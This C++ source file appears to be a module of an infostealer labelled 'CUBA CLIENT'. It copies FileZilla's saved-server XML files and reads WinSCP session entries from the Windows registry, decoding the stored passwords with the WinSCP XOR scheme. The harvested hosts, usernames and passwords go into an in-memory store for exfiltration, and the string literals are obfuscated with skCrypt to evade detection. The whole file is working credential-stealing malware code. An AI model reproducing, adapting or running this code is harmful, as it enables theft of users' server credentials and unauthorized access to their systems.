#include <misc_stealing/ftp_clients.hpp>
#include <filesystem>
#include <string>
#include <vector>
#include <windows.h>
#include <sysinfo.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/skCrypter.hpp>

namespace fs = std::filesystem;

static inline std::string sk_str(const char* p) { return p; }
#define SK(x) sk_str(skCrypt(x))

namespace misc_exfiltration {

//winscp xor, not real encryption
static std::string winscp_decode_pw(const std::string& encoded, const std::string& key) {
    if (encoded.empty() || encoded.size() % 2 != 0)
        return "";

    auto hex_digit = [](char c) -> int {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
        if (c >= 'a' && c <= 'f') return c - 'a' + 10;
        return 0;
    };

    std::vector<int> raw;
    for (size_t i = 0; i < encoded.size(); i += 2)
        raw.push_back((hex_digit(encoded[i + 1]) << 4) | hex_digit(encoded[i]));

    const int MAGIC = 0xA3;
    int flag = (~(raw[0] ^ MAGIC)) & 0xFF;
    size_t pos = 1;
    if (flag == 0xFF) pos = 3;
    if (pos >= raw.size()) return "";

    int len = (~(raw[pos++] ^ MAGIC ^ flag)) & 0xFF;

    std::string result;
    for (int i = 0; i < len && pos < raw.size(); i++, pos++)
        result += (char)((~(raw[pos] ^ MAGIC ^ flag)) & 0xFF);

    if (result.size() >= key.size() && result.substr(0, key.size()) == key)
        result = result.substr(key.size());

    return result;
}

void steal_ftp_clients() {
    //filezilla
    fs::path filezilla = fs::path(features::get_home()) / skCrypt("AppData") / skCrypt("Roaming") / skCrypt("FileZilla");
    {
        fs::path src = filezilla / skCrypt("recentservers.xml");
        if (fs::exists(src)) mem_store::import_file(skCrypt("ftp/recentservers.xml"), src);
    }
    {
        fs::path src = filezilla / skCrypt("sitemanager.xml");
        if (fs::exists(src)) mem_store::import_file(skCrypt("ftp/sitemanager.xml"), src);
    }

    //winscp sessions from registry
    HKEY hSessions;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, skCrypt("Software\\Martin Prikryl\\WinSCP 2\\Sessions"),
        0, KEY_READ, &hSessions) != ERROR_SUCCESS)
        return;

    std::string out;
    DWORD idx = 0;
    char sname[256];
    DWORD sname_len = sizeof(sname);

    while (RegEnumKeyExA(hSessions, idx++, sname, &sname_len,
        nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
        sname_len = sizeof(sname);

        HKEY hSess;
        if (RegOpenKeyExA(hSessions, sname, 0, KEY_READ, &hSess) != ERROR_SUCCESS) continue;

        auto read_str = [&](const char* val) -> std::string {
            char buf[512]{};
            DWORD sz = sizeof(buf);
            if (RegQueryValueExA(hSess, val, nullptr, nullptr, (LPBYTE)buf, &sz) == ERROR_SUCCESS)
                return buf;
            return "";
        };

        std::string host     = read_str(skCrypt("HostName"));
        std::string user     = read_str(skCrypt("UserName"));
        std::string enc_pass = read_str(skCrypt("Password"));
        std::string port     = read_str(skCrypt("PortNumber"));
        std::string pass     = winscp_decode_pw(enc_pass, user + host);

        out += skCrypt("Session: ") + std::string(sname) + "\n"
             + skCrypt("Host: ")    + host  + "\n"
             + skCrypt("Port: ")    + port  + "\n"
             + skCrypt("User: ")    + user  + "\n"
             + skCrypt("Pass: ")    + (pass.empty() ? enc_pass : pass) + "\n"
             + skCrypt("\n-# CUBA CLIENT #-\n");

        RegCloseKey(hSess);
    }
    RegCloseKey(hSessions);

    if (!out.empty())
        mem_store::append(skCrypt("ftp/winscp_sessions.txt"), out);
}

}
